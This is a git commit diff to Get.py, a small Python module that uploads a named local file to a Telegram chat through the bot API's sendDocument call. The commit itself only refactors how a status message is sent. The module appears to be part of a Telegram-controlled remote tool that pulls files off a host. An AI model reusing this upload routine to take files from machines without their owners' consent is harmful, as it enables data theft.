b843c66e9c860bc0974928671a5a649d463497d4
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-04-07 08:28:02 +0300

    Update Get.py

--- Get.py
+++ Get.py
@@ -5,14 +5,14 @@ class Get():
 		self.token = _.token
 		self.chat_id = _.chat_id
 		self.filename = _.args[0]
-		self.Send_Message = _.Send_Message
+		self._ = _
 		self.Main()
 
 	def Main(self):
 		if os.path.exists(self.filename):
 			requests.get('https://api.telegram.org/bot' + self.token + '/sendDocument?chat_id=' + self.chat_id, files = {'document' : open(self.filename,'rb')})
 			result = "%E2%9C%94%EF%B8%8F File Send Succeed."
-			self.Send_Message.Send(result)
+			self._.Send_Message(result)
 		else:
 			result = "%E2%9C%96%EF%B8%8F File Not Exists."
-			self.Send_Message.Send(result)
+			self._.Send_Message(result)
